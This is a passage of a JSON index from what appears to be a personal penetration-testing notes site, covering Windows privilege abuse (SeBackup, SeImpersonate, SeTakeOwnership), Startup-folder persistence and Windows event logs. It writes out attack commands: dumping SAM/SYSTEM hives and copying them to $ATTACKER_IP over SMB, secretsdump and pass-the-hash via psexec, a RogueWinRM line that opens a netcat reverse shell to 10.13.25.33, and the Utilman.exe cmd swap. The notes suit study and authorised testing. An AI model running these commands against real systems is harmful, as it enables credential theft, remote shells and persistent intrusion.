and&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&#039; the VB runtime. Alternately, TRIPLE double quotes can be&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&#039; used instead.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;shell.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Run&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;C:\\Windows\\System32\\calc.exe &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; WScript.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ScriptFullName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;True&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&#039; Alternate way to call calc.exe.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;shell.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Run&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;C:\\Windows\\System32\\calc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; WScript.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ScriptFullName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It appears that recent versions of Windows may &lt;em&gt;severely&lt;/em&gt; limit which binaries can be called from the &lt;code&gt;wscript.Shell&lt;/code&gt; object; calc.exe works, but pretty much nothing else does.&lt;/p&gt;"},"spells/Windows-SeBackup-and-SeRestore-permissions":{"slug":"spells/Windows-SeBackup-and-SeRestore-permissions","filePath":"spells/Windows SeBackup and SeRestore permissions.md","title":"Windows SeBackup and SeRestore permissions","links":["spells/Impacket"],"tags":["OS/Windows/SAM","OS/Windows/Permissions/SeBackup","OS/Windows/Permissions/SeRestore","Application/reg","Application/Impacket"],"content":"These permission allow full read (SeBackup) and write (SeRestore) access to any file. The first of these allows for exfiltration, while the second allows binaries to be replaced at will (combine with service- or task-based attacks!). The “Backup Operators” group has both of these permissions!\nBackup useful registry hives:\nreg save HKLM\\SYSTEM $PATH_TO_HIVE_FILE\nreg save HKLM\\SAM $PATH_TO_HIVE_FILE\nRun a local SMB server with Impacket:\nimpacket-smbserver -smb2support -username $CONNECTION_USER \\\n\t-password $CONNECTION_PASSWORD $SHARE_NAME $PATH_TO_DIRECTORY\nThen, just use copy on Windows:\ncopy $FILE \\\\$ATTACKER_IP\\$SHARE_NAME\\\nUse Impacket to dump hashes from a hive and perform a pass-the-hash attack:\n# Get hashes from SAM/SYSTEM hives\n#\nimpacket-secretsdump -sam $SAM_HIVE_FILE \\\n\t-system $SYSTEM_HIVE_FILE LOCAL\n \n# Get a shell by passing a hash\n#\nimpacket-psexec -hashes $FULL_NTLM_HASH $TARGET_USER@$TARGET_IP","richContent":"&lt;p&gt;These permission allow full read (SeBackup) and write (SeRestore) access to any file. The first of these allows for exfiltration, while the second allows binaries to be replaced at will (combine with service- or task-based attacks!). The “Backup Operators” group has &lt;em&gt;both&lt;/em&gt; of these permissions!&lt;/p&gt;\n&lt;p&gt;Backup useful registry hives:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg save HKLM\\SYSTEM &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_HIVE_FILE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg save HKLM\\SAM &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_HIVE_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Run a local SMB server with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Impacket&quot;&gt;Impacket&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;impacket-smbserver&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -smb2support&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -username&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CONNECTION_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-password&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CONNECTION_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SHARE_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PATH_TO_DIRECTORY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Then, just use copy on Windows:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;copy &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; \\\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SHARE_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\\&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Impacket&quot;&gt;Impacket&lt;/a&gt; to dump hashes from a hive and perform a pass-the-hash attack:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get hashes from SAM/SYSTEM hives&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;impacket-secretsdump&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sam&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SAM_HIVE_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SYSTEM_HIVE_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LOCAL&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get a shell by passing a hash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;impacket-psexec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -hashes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FULL_NTLM_HASH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Windows-SeImpersonate-and-SeAssignPrimaryToken-permissions":{"slug":"spells/Windows-SeImpersonate-and-SeAssignPrimaryToken-permissions","filePath":"spells/Windows SeImpersonate and SeAssignPrimaryToken permissions.md","title":"Windows SeImpersonate and SeAssignPrimaryToken permissions","links":[],"tags":["OS/Windows/Permissions/SeImpersonate","OS/Windows/Permissions/SeAssignPrimaryToken","Protocol/WinRM","Application/RogueWinRM","Application/PowerShell","AttackCycle/LateralMovement","AttackCycle/PrivEsc"],"content":"These permissions allow for user impersonation. On Windows, the Local Service and Network Service accounts already have these privileges; if IIS is installed, there will also often be an IIS AppPool/DefaultAppPool service account with these permissions as well.\nHowever, it isn’t enough to just have access to a service running as a user with these permissions, as Windows will not allow an application to arbitrarily impersonate a user. Instead, we must have a service and then trick/force a highly privileged account to connect to it, at which point impersonation will be allowed.\nOne way to do this is using the RogueWinRM exploit. The idea here is that when a user logs in, the BITS service creates a connection on port 5985 to the (local) WinRM service (which is used to execute PowerShell commands) as SYSTEM. If the WinRM service isn’t running, RogueWinRM can be run instead to capture these connections (I’m guessing that the WinRM service can also be back-doored using RogueWinRM directly, but that doing so may interfere with system functionality?).\nExample RogueWinRM command line:\nC:\\RogueWinRM.exe -p C:\\nc64.exe `\n                  -a &quot;-e cmd.exe 10.13.25.33 4442&quot;","richContent":"&lt;p&gt;These permissions allow for user impersonation. On Windows, the &lt;code&gt;Local Service&lt;/code&gt; and &lt;code&gt;Network Service&lt;/code&gt; accounts already have these privileges; if IIS is installed, there will also often be an &lt;code&gt;IIS AppPool/DefaultAppPool&lt;/code&gt; service account with these permissions as well.&lt;/p&gt;\n&lt;p&gt;&lt;em&gt;However&lt;/em&gt;, it &lt;em&gt;isn’t&lt;/em&gt; enough to just have access to a service running as a user with these permissions, as Windows will not allow an application to &lt;em&gt;arbitrarily&lt;/em&gt; impersonate a user. Instead, we must have a service and then &lt;em&gt;trick/force a highly privileged account to connect to it&lt;/em&gt;, at which point impersonation will be allowed.&lt;/p&gt;\n&lt;p&gt;One way to do this is using the RogueWinRM exploit. The idea here is that when a user logs in, the BITS service creates a connection on port 5985 to the (local) WinRM service (which is used to execute PowerShell commands) &lt;em&gt;as SYSTEM&lt;/em&gt;. If the WinRM service isn’t running, RogueWinRM can be run instead to capture these connections (I’m guessing that the WinRM service can also be back-doored using RogueWinRM directly, but that doing so may interfere with system functionality?).&lt;/p&gt;\n&lt;p&gt;Example RogueWinRM command line:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;RogueWinRM.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;p C:\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;nc64.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;a &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-e cmd.exe 10.13.25.33 4442&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Windows-SeTakeOwnership-permission":{"slug":"spells/Windows-SeTakeOwnership-permission","filePath":"spells/Windows SeTakeOwnership permission.md","title":"Windows SeTakeOwnership permission","links":[],"tags":["Application/icacls","OS/Windows/Permissions/SeTakeOwnership","Application/takeown","OS/Windows"],"content":"This permission allows a user to take ownership of any file or object (!!!).\n# Take ownership of a file\n#\ntakeown /f $PATH_TO_FILE\n \n# Give your user ($USERNAME) full access (F) to said file\n#\nicacls $PATH_TO_FILE /grant $USERNAME:F\nThe “standard” file to replace with cmd.exe with this trick is C:\\Windows\\System32\\Utilman.exe, which provides accessibility services access from lock and login screens.","richContent":"&lt;p&gt;This permission allows a user to take ownership of any file or object (!!!).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Take ownership of a file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;takeown &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;f &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_FILE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Give your user ($USERNAME) full access (F) to said file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;icacls &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;grant &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;USERNAME:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The “standard” file to replace with cmd.exe with this trick is &lt;code&gt;C:\\Windows\\System32\\Utilman.exe&lt;/code&gt;, which provides accessibility services access from lock and login screens.&lt;/p&gt;"},"spells/Windows-Startup-folder":{"slug":"spells/Windows-Startup-folder","filePath":"spells/Windows Startup folder.md","title":"Windows Startup folder","links":[],"tags":["OS/Windows"],"content":"Individual startup folders are located at C:\\Users\\$USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup .\nThe shared startup folder is at C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup; any shortcut placed here will spawn an application on any (normal) user login.\n(The “contents” of a user’s Startup folder is the union of these two folders. If memory serves, the user folder will override the system folder for items with exactly the same name. Note that executables can be dropped into this folder in addition to shortcuts, though doing so may make it more difficult to hide a backdoor…)","richContent":"&lt;p&gt;Individual startup folders are located at &lt;code&gt;C:\\Users\\$USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&lt;/code&gt; .&lt;/p&gt;\n&lt;p&gt;The shared startup folder is at &lt;code&gt;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&lt;/code&gt;; any shortcut placed here will spawn an application on &lt;em&gt;any&lt;/em&gt; (normal) user login.&lt;/p&gt;\n&lt;p&gt;(The “contents” of a user’s Startup folder is the union of these two folders. If memory serves, the user folder will override the system folder for items with &lt;em&gt;exactly&lt;/em&gt; the same name. Note that executables can be dropped into this folder in addition to shortcuts, though doing so may make it more difficult to hide a backdoor…)&lt;/p&gt;"},"spells/Windows-event-IDs":{"slug":"spells/Windows-event-IDs","filePath":"spells/Windows event IDs.md","title":"Windows event IDs","links":["spells/Windows-event-logs"],"tags":["OS/Windows/EventLog"],"content":"\n104 — Event log was cleared\n1102 — Audit log was cleared (517 on Windows 2003 and earlier)\n4104 — PowerShell command and script logging\n4626 — Successful logon\n\nLogonType 3 represents a (generic) network login\nLogonType 9 represents a logon where the outbound credentials are different than the credentials used to authenticate to the account that is initiating that login (only logged by the host initiating the connection, however)\n\n\n\nIt’s hard to find documentation about event ID, and the meaning seems to shift between versions of Windows.","richContent":"&lt;ul&gt;\n&lt;li&gt;104 — &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-event-logs&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-event-logs&quot;&gt;Event log&lt;/a&gt; was cleared&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://support.alertlogic.com/hc/en-us/articles/115004121423-Windows-Security-Event-Log-Cleared&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;1102&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — Audit log was cleared (&lt;a href=&quot;https://serverfault.com/questions/743575/how-to-find-out-who-deleted-event-viewer-logs/743577#743577&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;517&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; on Windows 2003 and earlier)&lt;/li&gt;\n&lt;li&gt;4104 — PowerShell command and script logging&lt;/li&gt;\n&lt;li&gt;4626 — Successful logon\n&lt;ul&gt;\n&lt;li&gt;LogonType 3 represents a (generic) network login&lt;/li&gt;\n&lt;li&gt;LogonType 9 represents a logon where the outbound credentials are different than the credentials used to authenticate to the account that is initiating that login (only logged by the host &lt;em&gt;initiating&lt;/em&gt; the connection, however)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;It’s hard to find documentation about event ID, and the meaning seems to shift between versions of Windows.&lt;/p&gt;"},"spells/Windows-event-logs":{"slug":"spells/Windows-event-logs","filePath":"spells/Windows event logs.md","title":"Windows event logs","links":["spells/Windows-event-IDs"],"tags":["OS/Windows/EventLog"],"content":"Log types\n\nApplication — Contains events logged by applications. For example, a database application might record a file error. The application developer decides which events to record.\nSecurity — Contains events such as valid and invalid logon attempts, as well as events related to resource use such as creating, opening, or deleting files or other objects. An administrator can start auditing to record events in the security log.\nSystem — Contains events logged by system components, such as the failure of a driver or other system component to load during startup.\n[CustomLog] — Contains events logged by applications that create a custom log. Using a custom log enables an application to control the size of the log or attach ACLs for security purposes without affecting other applications.\n\nLog fields\n\nType — Warning, error, information, etc.\nTime — Date/time for the computer sending the log\nComputer — Computer name\nProvider Type — The facility that generated the event (generally the Windows Event Log)\nProvider Name — The name of the log (Application, Security, etc.)\nSource — Application\nEvent ID — Standardized (not unique!) identifier\nDescription — Self-explanatory\n\nMicrosoft has more detailed documentation.\nEvent types\n\nError — An event that indicates a significant problem such as loss of data or loss of functionality. For example, if a service fails to load during startup, an Error event is logged.\nWarning — An event that is not necessarily significant, but may indicate a possible future problem. For example, when disk space is low, a Warning event is logged. If an application can recover from an event without loss of functionality or data, it can generally classify the event as a Warning event.\nInformation — An event that describes the successful operation of an application, driver, or service. For example, when a network driver loads successfully, it may be appropriate to log an Information event. Note that it is generally inappropriate for a desktop application to log an event each time it starts.\nSuccess Audit — An event that records an audited security access attempt that is successful. For example, a user’s successful attempt to log on to the system is logged as a Success Audit event.\nFailure Audit — An event that records an audited security access attempt that fails. For example, if a user tries to access a network drive and fails, the attempt is logged as a Failure Audit event.\n\nMicrosoft has more detailed documentation.\nEvent IDs\nTransclude of Windows-event-IDs","richContent":"&lt;h2 id=&quot;log-types&quot;&gt;Log types&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#log-types&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Application — Contains events logged by applications. For example, a database application might record a file error. The application developer decides which events to record.&lt;/li&gt;\n&lt;li&gt;Security — Contains events such as valid and invalid logon attempts, as well as events related to resource use such as creating, opening, or deleting files or other objects. An administrator can start auditing to record events in the security log.&lt;/li&gt;\n&lt;li&gt;System — Contains events logged by system components, such as the failure of a driver or other system component to load during startup.&lt;/li&gt;\n&lt;li&gt;[CustomLog] — Contains events logged by applications that create a custom log. Using a custom log enables an application to control the size of the log or attach ACLs for security purposes without affecting other 